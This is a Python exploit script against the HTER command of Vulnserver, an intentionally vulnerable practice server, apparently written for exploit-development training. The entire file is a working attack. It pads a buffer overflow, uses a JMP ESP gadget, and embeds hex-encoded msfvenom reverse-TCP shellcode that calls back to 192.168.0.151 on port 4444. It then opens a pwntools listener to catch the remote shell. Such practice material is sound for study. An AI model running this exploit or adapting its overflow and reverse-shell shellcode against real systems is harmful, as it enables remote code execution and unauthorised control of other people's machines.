#!/usr/bin/env python3
#
# Vulnserver::HTER exploit
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

# Only following characters are allowed: "ABCDEFabcdef1234567890"
# as they are interpreted as hex-encoded bytes, any shellcode can be easilly build

import sys
import pwn
from threading import Thread
from binascii import hexlify

# set target info
RHOST = '127.0.0.1'
RPORT = 9999
LPORT = 4444


def encode(bytes):
    encoded = ""
    for i in range(0, len(bytes), 4):
        encoded += hexlify(bytes[i:i+4])
    return encoded.upper()


def generate_payload():
    NOP = "C"  # noqa: F841
    JMP_ESP_GADGET = "05125062"  # 0x62501205: jmp esp - the address is written as string
    # JMP EAX could be used for egghunter, full shellcode can't be stored there as it's being clobbered by LoadLibraryA

    payload = ""
    payload += NOP  # one dummy byte in front

    # msfvenom -f python -v shellcode -p windows/shell_reverse_tcp LHOST=192.168.0.151 LPORT=4444 EXITFUNC=thread -b "\x00" BufferRegister=esp # noqa: E501
    shellcode = ""
    shellcode += "\x89\xe0\xba\x03\xcc\x3e\x48\x29\xc9\xb1\x52\x31"
    shellcode += "\x50\x12\x83\xc0\x04\x03\x53\xc2\xdc\xbd\xaf\x32"
    shellcode += "\xa2\x3e\x4f\xc3\xc3\xb7\xaa\xf2\xc3\xac\xbf\xa5"
    shellcode += "\xf3\xa7\xed\x49\x7f\xe5\x05\xd9\x0d\x22\x2a\x6a"
    shellcode += "\xbb\x14\x05\x6b\x90\x65\x04\xef\xeb\xb9\xe6\xce"
    shellcode += "\x23\xcc\xe7\x17\x59\x3d\xb5\xc0\x15\x90\x29\x64"
    shellcode += "\x63\x29\xc2\x36\x65\x29\x37\x8e\x84\x18\xe6\x84"
    shellcode += "\xde\xba\x09\x48\x6b\xf3\x11\x8d\x56\x4d\xaa\x65"
    shellcode += "\x2c\x4c\x7a\xb4\xcd\xe3\x43\x78\x3c\xfd\x84\xbf"
    shellcode += "\xdf\x88\xfc\xc3\x62\x8b\x3b\xb9\xb8\x1e\xdf\x19"
    shellcode += "\x4a\xb8\x3b\x9b\x9f\x5f\xc8\x97\x54\x2b\x96\xbb"
    shellcode += "\x6b\xf8\xad\xc0\xe0\xff\x61\x41\xb2\xdb\xa5\x09"
    shellcode += "\x60\x45\xfc\xf7\xc7\x7a\x1e\x58\xb7\xde\x55\x75"
    shellcode += "\xac\x52\x34\x12\x01\x5f\xc6\xe2\x0d\xe8\xb5\xd0"
    shellcode += "\x92\x42\x51\x59\x5a\x4d\xa6\x9e\x71\x29\x38\x61"
    shellcode += "\x7a\x4a\x11\xa6\x2e\x1a\x09\x0f\x4f\xf1\xc9\xb0"
    shellcode += "\x9a\x56\x99\x1e\x75\x17\x49\xdf\x25\xff\x83\xd0"
    shellcode += "\x1a\x1f\xac\x3a\x33\x8a\x57\xad\xfc\xe3\x57\xba"
    shellcode += "\x95\xf1\x57\xd5\x39\x7f\xb1\xbf\xd1\x29\x6a\x28"
    shellcode += "\x4b\x70\xe0\xc9\x94\xae\x8d\xca\x1f\x5d\x72\x84"
    shellcode += "\xd7\x28\x60\x71\x18\x67\xda\xd4\x27\x5d\x72\xba"
    shellcode += "\xba\x3a\x82\xb5\xa6\x94\xd5\x92\x19\xed\xb3\x0e"
    shellcode += "\x03\x47\xa1\xd2\xd5\xa0\x61\x09\x26\x2e\x68\xdc"
    shellcode += "\x12\x14\x7a\x18\x9a\x10\x2e\xf4\xcd\xce\x98\xb2"
    shellcode += "\xa7\xa0\x72\x6d\x1b\x6b\x12\xe8\x57\xac\x64\xf5"
    shellcode += "\xbd\x5a\x88\x44\x68\x1b\xb7\x69\xfc\xab\xc0\x97"
    shellcode += "\x9c\x54\x1b\x1c\xbc\xb6\x89\x69\x55\x6f\x58\xd0"
    shellcode += "\x38\x90\xb7\x17\x45\x13\x3d\xe8\xb2\x0b\x34\xed"
    shellcode += "\xff\x8b\xa5\x9f\x90\x79\xc9\x0c\x90\xab"

    payload += NOP * (2041 - len(payload))
    payload += JMP_ESP_GADGET
    payload += encode(shellcode)
    payload += NOP * (8000 - len(payload))

    return "HTER {}\n".format(payload)


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
